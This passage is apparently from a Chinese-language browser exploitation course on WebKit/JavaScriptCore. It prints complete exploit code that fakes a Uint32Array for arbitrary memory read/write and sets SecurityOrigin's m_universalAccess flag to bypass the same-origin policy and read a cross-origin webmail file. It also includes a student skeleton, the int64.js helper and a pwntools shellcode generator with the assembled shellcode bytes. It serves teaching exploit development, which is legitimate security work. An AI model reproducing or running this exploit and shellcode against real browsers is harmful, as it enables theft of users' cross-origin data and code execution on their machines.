  document.getElementById('out').innerText+=x+'\n';
  console.log(x);
}

function read_offset_int64(obj, off) {
    return Int64.from_double(read_offset(obj, off));
}

function addr_of_int64(obj) {
    return Int64.from_double(addr_of(obj));
}

function obj_at_addr_int64(addr) {
    return obj_at_addr(addr.to_double());
}


let target_uint32_array = new Uint32Array(0x2000);

let holder = {
    //a: new Int64('0x01082b0000005300').JSC_as_JSValue(),
    a: read_offset_int64(target_uint32_array,0).JSC_as_JSValue(),
    b: false,
    c: target_uint32_array,
    d: new Int64(0x200).to_double()
}
delete holder.b;

let holder_ptr = addr_of_int64(holder);
let fake_ptr = holder_ptr.add(0x10);

print('Fake Object at: '+fake_ptr)
let fake_uint32_array = obj_at_addr_int64(fake_ptr);

function read_64(addr) {
    fake_uint32_array[4] = addr.low;
    fake_uint32_array[5] = addr.high;
    return new Int64(undefined, target_uint32_array[1], target_uint32_array[0]);
}
function write_64(addr, value) {
    fake_uint32_array[4] = addr.low;
    fake_uint32_array[5] = addr.high;
    target_uint32_array[0] = value.low;
    target_uint32_array[1] = value.high;
}

let real_array_ptr = addr_of_int64(target_uint32_array);
write_64(fake_ptr, read_64(real_array_ptr))
write_64(fake_ptr.add(24), read_64(real_array_ptr.add(24)))

let empty_obj = {};
write_64(holder_ptr, read_64(addr_of_int64(empty_obj)))

function dump(addr) {
  let out = '';
  for (let i=0; i<0x80; i+=8) {
    out += i.toString(16)+': '+read_64(addr.add(i)).toString() + '\n';
  }

  print(out);
}

function try_to_access_page() {
  try {
    print("Attempting to access SOP protected page...");

    var jsxhr = new XMLHttpRequest();
    jsxhr.open('GET', 'http://webmail.stackchk.fail/mail.json', false);
    jsxhr.send();

    var response = jsxhr.responseText;
    print("Success: ");
    print(response);
  } catch(e) {
    print(e)
  }
}


try_to_access_page();

print("Start SOP Bypass");
var JSXMLHttpRequest = new XMLHttpRequest();

var JSXMLHttpRequest_ptr = addr_of_int64(JSXMLHttpRequest);
print("JSXMLHttpRequest @ " + JSXMLHttpRequest_ptr);

var XMLHttpRequest_ptr = read_64(JSXMLHttpRequest_ptr.add(0x18)).sub(0x30)
print("XMLHttpRequest @ " + XMLHttpRequest_ptr);

var ScriptExecutionContext_ptr = read_64(XMLHttpRequest_ptr.add(0x8));
print("ScriptExecutionContext @ " + ScriptExecutionContext_ptr);

var SecurityOriginPolicy_ptr = read_64(ScriptExecutionContext_ptr.add(8));
print("SecurityOriginPolicy @ " + SecurityOriginPolicy_ptr);

var SecurityOrigin_ptr = read_64(SecurityOriginPolicy_ptr.add(8));
print("SecurityOrigin @ " + SecurityOrigin_ptr);

var SecurityOrigin_flags = read_64(SecurityOrigin_ptr.add(0x31));
print("SecurityOrigin->m_universalAccess = " + (SecurityOrigin_flags.low&1));

var new_flags = SecurityOrigin_flags.add(1);
write_64(SecurityOrigin_ptr.add(0x31), new_flags);

SecurityOrigin_flags = read_64(SecurityOrigin_ptr.add(0x31));
print("SecurityOrigin->m_universalAccess = " + (SecurityOrigin_flags.low&1));

try_to_access_page();

</script>
```

**代码详细分析：**

#### 3.1.1 基础设施：Int64辅助函数

```javascript
function read_offset_int64(obj, off) {
    return Int64.from_double(read_offset(obj, off));
}

function addr_of_int64(obj) {
    return Int64.from_double(addr_of(obj));
}

function obj_at_addr_int64(addr) {
    return obj_at_addr(addr.to_double());
}
```

这些函数将原始的浮点数地址/值转换为 `Int64` 对象，便于进行64位地址运算。

- `read_offset_int64` — 从对象偏移处读取8字节，返回Int64
- `addr_of_int64` — 获取对象的内存地址，返回Int64
- `obj_at_addr_int64` — 在指定地址创建JS对象引用

> 注意：`read_offset`、`addr_of`、`obj_at_addr` 是由之前的漏洞利用原语（addrof/fakeobj）提供的基础函数。

#### 3.1.2 构造假Uint32Array实现任意读写

```javascript
let target_uint32_array = new Uint32Array(0x2000);

let holder = {
    a: read_offset_int64(target_uint32_array,0).JSC_as_JSValue(),
    b: false,
    c: target_uint32_array,
    d: new Int64(0x200).to_double()
}
delete holder.b;
```

**构造过程：**

1. 创建一个真实的 `Uint32Array(0x2000)` 作为读写目标
2. 创建 `holder` 对象，其内存布局为：
   - `a` (偏移0x10): 真实Uint32Array的JSCell header（作为假对象的JSCell）
   - `b` (已删除): 留出空间
   - `c` (偏移0x20): 指向真实Uint32Array的指针（作为假对象的butterfly/backing store）
   - `d` (偏移0x28): 0x200（作为假对象的length）

3. `delete holder.b` 删除属性b，使holder的内存布局更可控

**holder对象的内存布局：**

```
Offset  Content
0x00    JSCell header (holder自身)
0x08    butterfly pointer
0x10    property "a" = Uint32Array JSCell (假对象的JSCell)
0x18    (deleted "b" slot)
0x20    property "c" = target_uint32_array (假对象的m_vector)
0x28    property "d" = 0x200 (假对象的m_length)
```

```javascript
let holder_ptr = addr_of_int64(holder);
let fake_ptr = holder_ptr.add(0x10);

print('Fake Object at: '+fake_ptr)
let fake_uint32_array = obj_at_addr_int64(fake_ptr);
```

- `fake_ptr = holder_ptr + 0x10` — 假对象从holder的0x10偏移处开始
- `fake_uint32_array` — 使用fakeobj原语在假地址创建对象引用

#### 3.1.3 read_64 / write_64 实现

```javascript
function read_64(addr) {
    fake_uint32_array[4] = addr.low;
    fake_uint32_array[5] = addr.high;
    return new Int64(undefined, target_uint32_array[1], target_uint32_array[0]);
}
function write_64(addr, value) {
    fake_uint32_array[4] = addr.low;
    fake_uint32_array[5] = addr.high;
    target_uint32_array[0] = value.low;
    target_uint32_array[1] = value.high;
}
```

**工作原理：**

1. **修改假对象的m_vector指针** — `fake_uint32_array[4]` 和 `[5]` 对应假对象中的backing store指针（低32位和高32位）
2. **通过假对象读写** — 修改backing store后，假对象指向的 `target_uint32_array` 实际上指向了目标地址
3. **通过真实对象获取数据** — `target_uint32_array[0]` 和 `[1]` 读取目标地址处的8字节数据

**为什么需要同时修改假对象和通过真实对象访问？**

- 假对象的backing store被修改为目标地址
- 但假对象和真实对象共享同一块backing store内存
- 修改假对象的backing store指针后，真实对象的backing store也指向了同一位置
- 通过真实对象读写，实际上就是在读写目标地址

#### 3.1.4 修复假对象

```javascript
let real_array_ptr = addr_of_int64(target_uint32_array);
write_64(fake_ptr, read_64(real_array_ptr))
write_64(fake_ptr.add(24), read_64(real_array_ptr.add(24)))

let empty_obj = {};
write_64(holder_ptr, read_64(addr_of_int64(empty_obj)))
```

1. 将真实Uint32Array的JSCell header复制到假对象位置
2. 将真实Uint32Array的butterfly/mode信息复制到假对象
3. 将holder的JSCell header替换为普通对象的header（隐藏假对象痕迹）

#### 3.1.5 SOP绕过核心：指针链追踪

```javascript
try_to_access_page();

print("Start SOP Bypass");
var JSXMLHttpRequest = new XMLHttpRequest();

var JSXMLHttpRequest_ptr = addr_of_int64(JSXMLHttpRequest);
print("JSXMLHttpRequest @ " + JSXMLHttpRequest_ptr);

var XMLHttpRequest_ptr = read_64(JSXMLHttpRequest_ptr.add(0x18)).sub(0x30)
print("XMLHttpRequest @ " + XMLHttpRequest_ptr);

var ScriptExecutionContext_ptr = read_64(XMLHttpRequest_ptr.add(0x8));
print("ScriptExecutionContext @ " + ScriptExecutionContext_ptr);

var SecurityOriginPolicy_ptr = read_64(ScriptExecutionContext_ptr.add(8));
print("SecurityOriginPolicy @ " + SecurityOriginPolicy_ptr);

var SecurityOrigin_ptr = read_64(SecurityOriginPolicy_ptr.add(8));
print("SecurityOrigin @ " + SecurityOrigin_ptr);

var SecurityOrigin_flags = read_64(SecurityOrigin_ptr.add(0x31));
print("SecurityOrigin->m_universalAccess = " + (SecurityOrigin_flags.low&1));

var new_flags = SecurityOrigin_flags.add(1);
write_64(SecurityOrigin_ptr.add(0x31), new_flags);

SecurityOrigin_flags = read_64(SecurityOrigin_ptr.add(0x31));
print("SecurityOrigin->m_universalAccess = " + (SecurityOrigin_flags.low&1));

try_to_access_page();
```

**逐步追踪过程：**

| 步骤 | 操作 | 说明 |
|------|------|------|
| 1 | `addr_of_int64(JSXMLHttpRequest)` | 获取JS包装对象的地址 |
| 2 | `read_64(JSXMLHttpRequest_ptr.add(0x18)).sub(0x30)` | 从JS包装对象读取原生对象指针（减去tag偏移） |
| 3 | `read_64(XMLHttpRequest_ptr.add(0x8))` | 读取ScriptExecutionContext指针 |
| 4 | `read_64(ScriptExecutionContext_ptr.add(8))` | 读取SecurityOriginPolicy指针 |
| 5 | `read_64(SecurityOriginPolicy_ptr.add(8))` | 读取SecurityOrigin指针 |
| 6 | `read_64(SecurityOrigin_ptr.add(0x31))` | 读取包含m_universalAccess的8字节 |
| 7 | `SecurityOrigin_flags.low & 1` | 检查最低位（m_universalAccess的值） |
| 8 | `SecurityOrigin_flags.add(1)` | 将最低位设为1（设置m_universalAccess为true） |
| 9 | `write_64(SecurityOrigin_ptr.add(0x31), new_flags)` | 写回修改后的值 |

**运行输出预期：**

```
Attempting to access SOP protected page...
[DOMException: Blocked by CORS policy]

Start SOP Bypass
JSXMLHttpRequest @ 0x7fff...
XMLHttpRequest @ 0x7fff...
ScriptExecutionContext @ 0x7fff...
SecurityOriginPolicy @ 0x7fff...
SecurityOrigin @ 0x7fff...
SecurityOrigin->m_universalAccess = 0
SecurityOrigin->m_universalAccess = 1
Attempting to access SOP protected page...
Success:
{"mail": [...]}  ← 成功读取跨源数据！
```

---

### 3.2 sop_skeleton.txt 练习骨架代码分析

这是练习用的骨架代码，提供了 `read_64`/`write_64` 基础设施，需要学生填写指针链追踪部分。

**完整源码：**

```html
<pre id="out"></pre>
<script src="./int64.js"></script>
<script>

let print = (x) => {
  document.getElementById('out').innerText+=x+'\n';
  console.log(x);
}

function read_offset_int64(obj, off) {
    return Int64.from_double(read_offset(obj, off));
}

function addr_of_int64(obj) {
    return Int64.from_double(addr_of(obj));
}

function obj_at_addr_int64(addr) {
    return obj_at_addr(addr.to_double());
}


let target_uint32_array = new Uint32Array(0x2000);

let holder = {
    //a: new Int64('0x01082b0000005300').JSC_as_JSValue(),
    a: read_offset_int64(target_uint32_array,0).JSC_as_JSValue(),
    b: false,
    c: target_uint32_array,
    d: new Int64(0x200).to_double()
}
delete holder.b;

let holder_ptr = addr_of_int64(holder);
let fake_ptr = holder_ptr.add(0x10);

print('Fake Object at: '+fake_ptr)
let fake_uint32_array = obj_at_addr_int64(fake_ptr);

function read_64(addr) {
    fake_uint32_array[4] = addr.low;
    fake_uint32_array[5] = addr.high;
    return new Int64(undefined, target_uint32_array[1], target_uint32_array[0]);
}
function write_64(addr, value) {
    fake_uint32_array[4] = addr.low;
    fake_uint32_array[5] = addr.high;
    target_uint32_array[0] = value.low;
    target_uint32_array[1] = value.high;
}

let real_array_ptr = addr_of_int64(target_uint32_array);
write_64(fake_ptr, read_64(real_array_ptr))
write_64(fake_ptr.add(24), read_64(real_array_ptr.add(24)))

let empty_obj = {};
write_64(holder_ptr, read_64(addr_of_int64(empty_obj)))

function dump(addr) {
  let out = '';
  for (let i=0; i<0x80; i+=8) {
    out += i.toString(16)+': '+read_64(addr.add(i)).toString() + '\n';
  }
  print(out);
}

function try_to_access_page() {
  try {
    print("Attempting to access SOP protected page...");

    var jsxhr = new XMLHttpRequest();
    jsxhr.open('GET', 'http://webmail.stackchk.fail/mail.json', false);
    jsxhr.send();

    var response = jsxhr.responseText;
    print("Success: ");
    print(response);
  } catch(e) {
    print(e)
  }
}


try_to_access_page();

print("Start SOP Bypass");
var JSXMLHttpRequest = new XMLHttpRequest();

var JSXMLHttpRequest_ptr = addr_of_int64(JSXMLHttpRequest);
print("JSXMLHttpRequest @ " + JSXMLHttpRequest_ptr);

var XMLHttpRequest_ptr = read_64(JSXMLHttpRequest_ptr.add(0x18)).sub(0x30)
print("XMLHttpRequest @ " + XMLHttpRequest_ptr);

// ... More dereferences here ..... <------ Write rest of exploit!

write_64(SecurityOrigin_ptr.add(0x31), /* ... */);

SecurityOrigin_flags = read_64(SecurityOrigin_ptr.add(0x31));
print("SecurityOrigin->m_universalAccess = " + (SecurityOrigin_flags.low&1));

try_to_access_page();

</script>
```

**需要填写的部分：**

从 `XMLHttpRequest_ptr` 到 `SecurityOrigin_ptr` 的指针链追踪：

```javascript
var ScriptExecutionContext_ptr = read_64(XMLHttpRequest_ptr.add(0x8));
print("ScriptExecutionContext @ " + ScriptExecutionContext_ptr);

var SecurityOriginPolicy_ptr = read_64(ScriptExecutionContext_ptr.add(8));
print("SecurityOriginPolicy @ " + SecurityOriginPolicy_ptr);

var SecurityOrigin_ptr = read_64(SecurityOriginPolicy_ptr.add(8));
print("SecurityOrigin @ " + SecurityOrigin_ptr);
```

以及修改 `m_universalAccess` 的写操作：

```javascript
var SecurityOrigin_flags = read_64(SecurityOrigin_ptr.add(0x31));
var new_flags = SecurityOrigin_flags.add(1);
write_64(SecurityOrigin_ptr.add(0x31), new_flags);
```

**练习提示：**

1. 从 `JSXMLHttpRequest` 开始追踪
2. 参考2.5节的指针链追踪图
3. 注意每个偏移量的含义
4. 使用 `dump()` 函数可以查看任意地址的内存布局
5. 最终目标是找到 `SecurityOrigin + 0x31` 处的 `m_universalAccess` 并将其设为1

---

### 3.3 int64.js 辅助库分析

SOP绕过利用代码依赖 `int64.js` 辅助库，提供64位整数操作和JSC特定的编码转换。

**核心组件：**

#### 3.3.1 Binary转换工具

```javascript
var Binary = (function() {
    let memory = new ArrayBuffer(8);
    let view_u8 = new Uint8Array(memory);
    let view_u32 = new Uint32Array(memory);
    let view_f64 = new Float64Array(memory);

    return {
        view_u8: view_u8,
        view_u32: view_u32,
        view_f64: view_f64,

        i64_to_f64: (i64) => {
            view_u32[0] = i64.low;
            view_u32[1] = i64.high;
            return view_f64[0];
        },
        f64_to_i64: (f) => {
            view_f64[0] = f;
            return new Int64(undefined, view_u32[1], view_u32[0]);
        },
        i32_to_u32: (i32) => {
            view_u32[0] = i32;
            return view_u32[0];
        },
        // ...
    }
})();
```

使用 `ArrayBuffer` 的不同视图（Uint8Array、Uint32Array、Float64Array）实现整数和浮点数之间的类型双关(type punning)转换。

#### 3.3.2 Int64类

```javascript
class Int64 {
    constructor(v, high, low) {
        // 支持多种构造方式：Int64对象、高低位、字符串等
    }
    toString() {
        return '0x'+Binary.i32_to_u32(this.high)
            .toString(16).padStart(8,'0') +
        Binary.i32_to_u32(this.low)
            .toString(16).padStart(8,'0');
    }
    add(v) { return Int64.add(this, v); }
    sub(v) { return Int64.sub(this, v); }
    to_double() { return Binary.i64_to_f64(this); }
    JSC_as_JSValue() { return Int64.JSC_as_JSValue(this); }
}
```

#### 3.3.3 JSC JSValue编码

```javascript
Int64.JSC_as_JSValue = (a) => {
    a = Int64.to_Int64(a);
    let high = Binary.i32_to_u32(a.high);
    if (high < 0x10000 || high >= 0xffff0000)
        throw(a.toString()+" cannot be encoded as JSValue");

    a._sub_inplace(0x20000, 0);
    let res = Binary.i64_to_f64(a);
    a._add_inplace(0x20000, 0);
    return res;
}
```

JSC使用NaN-boxing编码JSValue。此函数将一个64位值编码为合法的JSValue（浮点数形式），使得可以通过JS对象的属性存储任意64位值。

**NaN-boxing原理：**

- JSC的JSValue使用IEEE 754双精度浮点数的NaN空间来编码非数值类型
- 高16位在 `0x0001` 到 `0xfffe` 范围内的值可以被编码为合法的JSValue
- 减去 `0x20000` 后转换为浮点数，读取时再加回来即可恢复原始值

---

### 3.4 shellcode.py — 辅助Shellcode生成

Day 4还包含一个Python shellcode生成脚本，用于生成x86-64 shellcode：

```python
from pwn import *

context.arch='amd64'

sc = shellcraft.pushstr("/bin/sh")
sc += shellcraft.mov('rdi','rsp')

sc += shellcraft.pushstr("-c")
sc += shellcraft.mov('r8','rsp')

pl = " /bin/bash -c 'for d in {0..15}; do (env HOME=/home/$(whoami) DISPLAY=:$d /usr/bin/gnome-calculator & sleep 5; env HOME=/home/$(whoami) DISPLAY=:$d feh -F https://upload.wikimedia.org/wikipedia/en/1/18/Wana_Decrypt0r_screenshot.png)& done'"

sc += shellcraft.pushstr(pl)
sc += shellcraft.mov('r9','rsp')

sc += shellcraft.push(0)
sc += shellcraft.push('r9')
sc += shellcraft.push('r8')
sc += shellcraft.push('rdi')

sc += shellcraft.syscall(59, 'rdi', 'rsp', 0)

sasm = asm(sc)
print(map(ord, sasm))
```

**Shellcode功能：**

1. 执行 `/bin/sh -c '...'`
2. 在所有可能的DISPLAY（:0到:15）上尝试启动 `gnome-calculator` 和 `feh`（显示WannaCry截图）
3. 这是Pwn2Own比赛中常用的"证明代码执行"方式

**生成的Shellcode数组：**

```javascript
const SHELLCODE = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 99, 104, 111, 46, 114, 105, 1, 72, 49, 4, 36, 72, 137, 231, 104, 44, 98, 1, 1, 129, 52, 36, 1, 1, 1, 1, 73, 137, 224, 104, 111, 100, 38, 1, 129, 52, 36, 1, 1, 1, 1, 72, 184, 116, 111, 114, 41, 38, 32, 100, 111, 80, 72, 184, 45, 99, 97, 108, 99, 117, 108, 97, 80, 72, 184, 105, 110, 47, 103, 110, 111, 109, 101, 80, 72, 184, 100, 32, 47, 117, 115, 114, 47, 98, 80, 72, 184, 83, 80, 76, 65, 89, 61, 58, 36, 80, 72, 184, 111, 97, 109, 105, 41, 32, 68, 73, 80, 72, 184, 111, 109, 101, 47, 36, 40, 119, 104, 80, 72, 184, 32, 72, 79, 77, 69, 61, 47, 104, 80, 72, 184, 32, 100, 111, 32, 40, 101, 110, 118, 80, 72, 184, 123, 48, 46, 46, 49, 53, 125, 59, 80, 72, 184, 111, 114, 32, 100, 32, 105, 110, 32, 80, 72, 184, 115, 104, 32, 45, 99, 32, 39, 102, 80, 72, 184, 32, 47, 98, 105, 110, 47, 98, 97, 80, 73, 137, 225, 106, 1, 254, 12, 36, 65, 81, 65, 80, 87, 106, 59, 88, 72, 137, 230, 153, 15, 5]
```

这个数组可以直接在JavaScript中写入RWX内存区域来执行shellcode。

---

## 四、Day 4 课程总结

### 4.1 核心知识点回顾

**浏览器缓解措施：**

| 缓解措施 | 引擎 | 核心思想 | 绕过方式 |
|----------|------|---------|---------|
| Isoheaps | WebKit | 不同类型对象独立堆 | 寻找未受保护的对象类型 |
| Gigacage | WebKit | 指针笼化+堆跑道 | WASM Memory(已修复)、Butterfly |
| 随机化StructureID | WebKit | ID底部7位随机化 | 泄漏真实JSCell header、绕过Structure查找 |
| JIT重映射 | WebKit(iOS) | JIT页面R/X和R/W切换 | 需要ROP |
| PAC | WebKit(iOS) | 指针签名验证 | 伪造gadget、交换指针、数据攻击 |
| Partition Alloc | Chromium | 不同类型/大小独立分区 | 寻找跨分区漏洞 |
| W^X JIT | Chromium | JIT页面不同时W和X | WASM JIT页面、JIT走私、竞争、数据攻击 |
| Site Isolation | Chromium | 每个源独立渲染器进程 | 尚未完全实现、Android未启用 |

**渲染器攻击：**

| 攻击 | 描述 |
|------|------|
| SOP绕过 | 修改 `m_universalAccess` 绕过同源策略 |
| UXSS | 通过浏览器漏洞在其他源上执行JS |
| 数据攻击 | 不劫持代码执行，利用任意读写操作数据 |

### 4.2 关键洞察

1. **缓解措施不是终结者** — 只是提高了攻击门槛，通常意味着更多工作或需要更多漏洞
2. **SOP检查在渲染器中执行** — 有了任意读写就能绕过SOP，不需要代码执行
3. **数据攻击是未来方向** — 在PAC等控制流保护越来越强的背景下，数据攻击比代码执行攻击更可行
4. **Site Isolation有副作用** — 虽然增强了安全性，但独立进程的特性可被攻击者利用
5. **WASM是常见的绕过入口** — WASM的JIT页面和内存管理经常缺乏与主引擎同等的保护
